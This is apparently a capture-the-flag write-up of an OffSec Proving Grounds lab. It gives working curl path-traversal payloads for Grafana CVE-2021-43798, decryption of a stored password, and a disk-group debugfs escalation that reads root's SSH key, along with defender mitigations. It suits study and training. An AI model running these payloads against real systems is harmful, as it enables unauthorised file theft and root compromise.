# Fantastic(linux) — Proving Grounds Writeup

**Platform:** Proving Grounds Practice
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Job Role:** Junior Penetration Tester
**Tags:** Grafana CVE-2021-43798 · SQLite Database Analysis · AES Decryption · Disk Group Abuse · debugfs Privilege Escalation

---

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation — Grafana Path Traversal CVE-2021-43798](#exploitation--grafana-path-traversal-cve-2021-43798)
5. [Database Analysis & Password Decryption](#database-analysis--password-decryption)
6. [Initial Access](#initial-access)
7. [Privilege Escalation — Disk Group + debugfs](#privilege-escalation--disk-group--debugfs)
8. [Flags](#flags)
9. [Attack Chain](#-attack-chain)
10. [Skills Demonstrated](#-skills-demonstrated)
11. [Lessons Learned](#-lessons-learned)
12. [References](#references)

---

## Lab Overview

> *"This lab will be exploited by leveraging vulnerabilities identified in Grafana v8.3.0. Publicly available exploits will be used to obtain a secret key, which will then be decrypted to retrieve the system admin password, allowing for root-level access to the system. This lab focuses on exploiting application vulnerabilities and privilege escalation methods."*

**Key Objectives:**
- Identify and exploit Grafana 8.3.0 directory traversal vulnerability (CVE-2021-43798)
- Extract and analyze the Grafana SQLite database to recover an encrypted admin password
- Decrypt AES-encrypted credentials using the Grafana secret key
- Escalate privileges by abusing `disk` group membership and `debugfs` to extract the root SSH private key

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.156.181
```

**Screenshot — Nmap Scan Results:**

![Nmap Scan](screenshots/nmap_scan.png)

**Ports Discovered:**

| Port | State | Service | Version / Notes |
|------|-------|---------|-----------------|
| 22 | open | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 |
| 3000 | open | HTTP | Grafana — `http-title: Grafana` |
| 9090 | open | HTTP | Golang net/http — Prometheus Time Series Collection Server |

**Key Nmap Findings:**
- Port 3000: HTTP title confirms **Grafana** — `/login` redirect, `robots.txt` disallows `/`
- Port 9090: **Prometheus** monitoring server (Go-IPFS json-rpc or InfluxDB API)
- OS fingerprint: Linux 5.X — device type general purpose/router

---

## Enumeration

### Port 3000 — Grafana Login Panel

Navigating to `http://192.168.156.181:3000` reveals a **Grafana** login page.

**Screenshot — Grafana Login Page (Port 3000):**

![Grafana Login](screenshots/grafana_login.png)

The Grafana footer reveals the version: **v8.3.0 (1f1eb021)**

> **Critical Finding:** Grafana 8.3.0 is vulnerable to **CVE-2021-43798** — an unauthenticated directory traversal vulnerability allowing arbitrary file read.

---

## Exploitation — Grafana Path Traversal CVE-2021-43798

### Vulnerability Details

**CVE:** CVE-2021-43798
**Type:** Unauthenticated Directory Traversal / Arbitrary File Read
**Affected Version:** Grafana < 8.3.1
**CVSS Score:** 7.5 (High)
**Reference:** https://hackerone.com/reports/1427086

The vulnerability exists in the `/public/plugins/<plugin-name>/` endpoint. By using URL-encoded path traversal sequences (`..%2F`), an unauthenticated attacker can read arbitrary files from the server filesystem.

### Step 1 — Read /etc/passwd

```bash
curl http://192.168.156.181:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

**Screenshot — /etc/passwd via Path Traversal:**

![/etc/passwd Leaked](screenshots/etc_passwd.png)

**Key Users Identified:**

```
root:x:0:0:root:/root:/bin/bash
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh     ← Target user
grafana:x:113:117::/usr/share/grafana:/bin/false
prometheus:x:1000:1000::/home/prometheus:/bin/false
```

> **Note:** User `sysadmin` is found with UID 1001. This will be our SSH target once credentials are obtained.

### Step 2 — Read Grafana Default Configuration

```bash
curl http://192.168.156.181:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fshare%2Fgrafana%2Fconf%2Fdefaults.ini
```

**Screenshot — Grafana Config Defaults Leaked:**

![Grafana Config](screenshots/grafana_defaults_ini.png)

The config reveals the default data path as `data = data`, confirming the SQLite database location at `/var/lib/grafana/grafana.db`.

### Step 3 — Download the Grafana Database

```bash
curl http://192.168.156.181:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db \
  --output grafana.db
```

**Screenshot — grafana.db Downloaded:**

![Grafana DB Download](screenshots/grafana_db_download.png)

Verify the file:

```bash
file grafana.db
# grafana.db: SQLite 3.x database, last written using SQLite version 3035004
```

---

## Database Analysis & Password Decryption

### Step 4 — Analyze grafana.db with SQLite Browser

Open the database with SQLite Browser (pre-installed on Kali Linux):

```bash
# GUI: Applications → SQLite Browser
# Or CLI:
sqlite3 grafana.db
sqlite> SELECT * FROM data_source;
```

**Screenshot — SQLite Browser Showing Encrypted Password:**

![SQLite Browser](screenshots/sqlite_browser.png)

**Encrypted credential found in `data_source` table:**

```json
"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="
```

> **Analysis:** Grafana uses **AES encryption** with a secret key stored in the `grafana.ini` configuration file. The `basicAuthPassword` is AES-CBC encrypted and base64-encoded.

### Step 5 — Decrypt the Password

Using the Grafana CVE-2021-43798 decryptor:

**Reference:** https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798

```bash
pip install requests questionary termcolor cryptography
python3 decrypt.py
```

**Screenshot — Grafana Decryptor Output:**

![Password Decrypted](screenshots/grafana_decrypt.png)

```
[*] DataSourcePassword: anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] plainText= SuperSecureP@ssw0rd
```

**Decrypted Credentials:**

```
username : sysadmin
password : SuperSecureP@ssw0rd
```

---

## Initial Access

### Step 6 — SSH Login as sysadmin

```bash
ssh sysadmin@192.168.156.181
# Password: SuperSecureP@ssw0rd
```

**Screenshot — SSH Shell as sysadmin:**

![SSH Access](screenshots/ssh_initial_access.png)

```
Welcome to Ubuntu 20.04.19 LTS (GNU/Linux 5.14.0-1 generic x86_64)
sysadmin@fanatastic:~$
```

---

## Privilege Escalation — Disk Group + debugfs

### Step 7 — Run Linpeas for Privilege Escalation Enumeration

Upload and run `linpeas.sh` on the target:

```bash
# On attacker:
python3 -m http.server 80

# On target:
wget http://192.168.45.XXX/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Screenshot — Linpeas Disk Group Finding:**

![Linpeas Disk Group](screenshots/linpeas_disk_group.png)

**Critical Finding from Linpeas:**

```
===========================( Users Information )===========================
[*] My user
id=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
```

> **Exploit Vector:** The `sysadmin` user is a member of the **`disk` group**. This grants direct read access to block devices, bypassing file system permissions — effectively allowing reading of any file on the system, including `/root/.ssh/id_rsa`.

**Reference:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users

### Step 8 — Identify Root Partition with df

```bash
df -h
```

**Screenshot — Disk Space & Partition Layout:**

![df -h output](screenshots/df_h.png)

```
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda2       9.8G  5.6G  3.7G  61%  /
```

> **Key Finding:** `/dev/sda2` is mounted at `/` — this is the partition containing the root filesystem.

### Step 9 — Use debugfs to Extract Root SSH Key

```bash
debugfs /dev/sda2
```

```
debugfs 1.45.5 (07-Jan-2020)
debugfs: cat /root/.ssh/id_rsa
```

**Screenshot — Root SSH Private Key via debugfs:**

![debugfs SSH Key](screenshots/debugfs_id_rsa.png)

The full RSA private key is displayed. Copy the entire key output.

### Step 10 — Save & Use the Private Key

```bash
# On attacker machine:
nano id_rsa
# Paste the private key content

chmod 600 id_rsa

# Connect as root:
ssh root@192.168.156.181 -i id_rsa
```

**Screenshot — SSH as Root Using Extracted Key:**

![Root SSH Login](screenshots/root_ssh_login.png)

```
Last login: Tue Mar  1 18:46:45 2022
root@fanatastic:~#
```

**Root access confirmed!**

---

## Flags

### local.txt

```bash
sysadmin@fanatastic:~$ ls
local.txt
sysadmin@fanatastic:~$ cat local.txt
d12d2f71594b2ed1b7987861b1d556e8
```

**Screenshot — local.txt:**

![local.txt](screenshots/local_txt.png)

### proof.txt

```bash
root@fanatastic:~# ls
proof.txt  snap
root@fanatastic:~# cat proof.txt
12c2e35a88de074c9ceede34e1064e47
```

**Screenshot — proof.txt:**

![proof.txt](screenshots/proof_txt.png)

---

## 🗺️ Attack Chain

```
Target: 192.168.156.181
│
├── [Reconnaissance] nmap -sC -sV -sS -A -T5 -p- -Pn
│       ├── Port 22:   SSH (OpenSSH 8.2p1 Ubuntu)
│       ├── Port 3000: HTTP — Grafana v8.3.0
│       └── Port 9090: HTTP — Prometheus monitoring server
│
├── [Enumeration] Web Service Identification
│       ├── Port 3000: Grafana login panel — version 8.3.0 confirmed in footer
│       └── Port 9090: Prometheus metrics server (not exploited)
│
├── [Exploit] Grafana Directory Traversal — CVE-2021-43798
│       ├── Read /etc/passwd → identified user: sysadmin (UID 1001)
│       ├── Read /usr/share/grafana/conf/defaults.ini → DB path confirmed
│       ├── Downloaded /var/lib/grafana/grafana.db → SQLite database
│       └── Extracted encrypted credential from data_source table:
│               → anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
│
├── [Credential Decryption] Grafana AES Decryptor
│       ├── Tool: Grafana-Decryptor-for-CVE-2021-43798
│       ├── pip install requests questionary termcolor cryptography
│       ├── python3 decrypt.py
│       └── Decrypted password: SuperSecureP@ssw0rd
│
├── [Initial Access] SSH as sysadmin
│       ├── ssh sysadmin@192.168.156.181
│       ├── Password: SuperSecureP@ssw0rd
│       └── local.txt: d12d2f71594b2ed1b7987861b1d556e8
│
├── [Post-Exploitation] Linpeas Enumeration
│       └── Discovered: sysadmin in disk group (gid=6)
│               → Direct raw block device read access
│
└── [Privilege Escalation] Disk Group + debugfs SSH Key Extraction
        ├── df -h → /dev/sda2 mounted at /
        ├── debugfs /dev/sda2
        ├── debugfs: cat /root/.ssh/id_rsa → full RSA key extracted
        ├── chmod 600 id_rsa
        └── ssh root@192.168.156.181 -i id_rsa
                └── proof.txt: 12c2e35a88de074c9ceede34e1064e47 ✅
```

---

## 🛡️ Skills Demonstrated

| Skill | Application | MITRE ATT&CK |
|-------|-------------|--------------|
| **Network Reconnaissance** | nmap full port scan identifying Grafana and Prometheus services | T1046 — Network Service Scanning |
| **CVE Research & Application** | Identified and exploited Grafana 8.3.0 CVE-2021-43798 | T1190 — Exploit Public-Facing Application |
| **Path Traversal Exploitation** | Used URL-encoded `..%2F` sequences to read arbitrary files | T1083 — File and Directory Discovery |
| **Sensitive File Extraction** | Retrieved `/etc/passwd`, config files, and SQLite database | T1552.001 — Credentials in Files |
| **SQLite Database Analysis** | Opened and queried grafana.db to extract encrypted credentials | T1213 — Data from Information Repositories |
| **Cryptographic Analysis** | Decrypted AES-encrypted Grafana admin password using secret key | T1600 — Weaken Encryption |
| **Credential Reuse** | Used decrypted password for SSH access as sysadmin | T1078 — Valid Accounts |
| **Linux Enumeration (Linpeas)** | Automated privilege escalation discovery via linpeas.sh | T1007 — System Service Discovery |
| **Disk Group Privilege Escalation** | Leveraged raw block device access via disk group membership | T1068 — Exploitation for Privilege Escalation |
| **debugfs Exploitation** | Used debugfs to read root `.ssh` directory on raw block device | T1083 — File and Directory Discovery |
| **SSH Key Extraction & Reuse** | Extracted root RSA private key and authenticated as root | T1552.004 — Private Keys |
| **Penetration Testing Methodology** | Full attack chain: recon → CVE exploit → decrypt → privesc → root | — |

---

## 📚 Lessons Learned

### 🔴 For Attackers (Pentesters)

- **Always check version numbers on web applications.** The Grafana footer directly revealed version `8.3.0` — a single search confirms CVE-2021-43798 with public PoC.
- **Directory traversal in plugins is a powerful read primitive.** CVE-2021-43798 affects all Grafana plugin endpoints. Try multiple plugin names (`mysql`, `grafana-clock-panel`, `alertlist`) if one doesn't work.
- **Grafana databases are SQLite and contain encrypted credentials.** After downloading `grafana.db`, inspect the `data_source` and `user` tables — they often contain password hashes or AES-encrypted secrets.
- **Grafana AES encryption is reversible if you have the secret key.** The secret key is stored in `grafana.ini` (`[security] secret_key`). If you can read that file via path traversal, the encryption is completely broken.
- **`disk` group membership is critical privesc.** It grants raw read access to block devices — equivalent to reading any file on the filesystem without any permission checks. Always check group membership via `id` or linpeas output.
- **`debugfs` is the simplest disk group exploit.** It's a filesystem debugger that works directly on block devices. `cat /root/.ssh/id_rsa` inside debugfs bypasses all Linux file permissions entirely.
- **SSH private keys are the cleanest path to root.** Stable, interactive, fully authenticated — always prioritize extracting SSH keys over maintaining a reverse shell.

### 🔵 For Defenders

- **Update Grafana immediately.** CVE-2021-43798 was patched in Grafana 8.3.1. Running unpatched Grafana on a network-accessible port is a critical risk — patch or upgrade immediately.
- **Never expose Grafana or monitoring dashboards directly to the internet.** Place monitoring services behind VPN, network ACLs, or firewall rules. Port 3000 and 9090 should not be publicly accessible.
- **Rotate Grafana secret keys and credentials after any compromise.** The secret key in `grafana.ini` is used to decrypt all stored data source passwords — treat it as a master credential.
- **Use strong, unique passwords for all service accounts.** `SuperSecureP@ssw0rd` is weak despite its appearance — use a proper password manager and generate cryptographically random secrets.
- **Audit and restrict group memberships strictly.** Regular users should never be in the `disk` group. Audit with: `grep disk /etc/group` and remove unnecessary members immediately.
- **Monitor and alert on `debugfs` usage.** Legitimate use of `debugfs` is rare in production environments. Audit logs with: `auditctl -w /usr/sbin/debugfs -p x` and alert on any execution.
- **Protect root SSH keys.** Disable root SSH login (`PermitRootLogin no` in `sshd_config`) and use certificate-based authentication with short validity periods.
- **Deploy a HIDS/file integrity monitor.** Tools like AIDE, Tripwire, or OSSEC can alert on unauthorized reads of sensitive files like `/etc/shadow` and `/root/.ssh/`.
- **Encrypt the entire disk.** Disk-level encryption (LUKS) ensures that even with `disk` group access, raw block device reads return encrypted data — mitigating this entire attack class.
- **Run regular vulnerability scans.** Tools like OpenVAS, Nessus, or Tenable.io would detect CVE-2021-43798 as critical and flag Grafana for immediate patching.

### 🟡 Key Vulnerabilities Summary

| Vulnerability | Root Cause | Severity | Impact | Mitigation |
|---------------|-----------|----------|--------|-----------|
| **Grafana Path Traversal** | Missing input validation on plugin endpoints | Critical | Unauthenticated arbitrary file read | Upgrade to Grafana ≥ 8.3.1 |
| **Encrypted Credential Exposure** | grafana.db readable via path traversal | High | Admin credential recovery | Restrict database file permissions; patch CVE |
| **Weak AES Key Management** | Secret key stored in readable config | High | Full credential decryption | Rotate secret keys; restrict config file access |
| **Disk Group Misconfiguration** | sysadmin unnecessarily in disk group | Critical | Read any file bypassing permissions | Remove users from disk group; audit all groups |
| **Root SSH Key Accessible** | No disk encryption protecting raw device | Critical | Full root compromise via key extraction | Enable LUKS; disable root SSH login |
| **Unpatched Web Application** | Grafana 8.3.0 in production | Critical | Unauthenticated RCE potential | Implement patch management policy |

---

## References

- [CVE-2021-43798 — Grafana Path Traversal (HackerOne)](https://hackerone.com/reports/1427086)
- [Grafana-Decryptor-for-CVE-2021-43798 (GitHub)](https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798)
- [HackTricks — Linux Disk Group Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users)
- [Grafana Security Advisory — CVE-2021-43798](https://grafana.com/blog/2021/12/07/grafana-8.3.1-and-7.5.12-released-with-moderate-severity-security-fix/)
- [MITRE ATT&CK — T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK — T1068: Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
- [MITRE ATT&CK — T1552.004: Private Keys](https://attack.mitre.org/techniques/T1552/004/)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and service version detection |
| `curl` | Path traversal exploitation and file extraction |
| `sqlite3` / SQLite Browser | Grafana database analysis |
| `pip` + `python3 decrypt.py` | AES password decryption |
| `linpeas.sh` | Automated post-exploitation enumeration |
| `debugfs` | Raw block device access for SSH key extraction |
| `ssh` | Initial access and root login via extracted key |

---

**Platform:** OffSec Proving Grounds Practice
**Author:** Tanvir Ahmed | [tanvirkarim.it](https://tanvirkarim.it)
**GitHub:** [github.com/Tanvir-2](https://github.com/Tanvir-2)
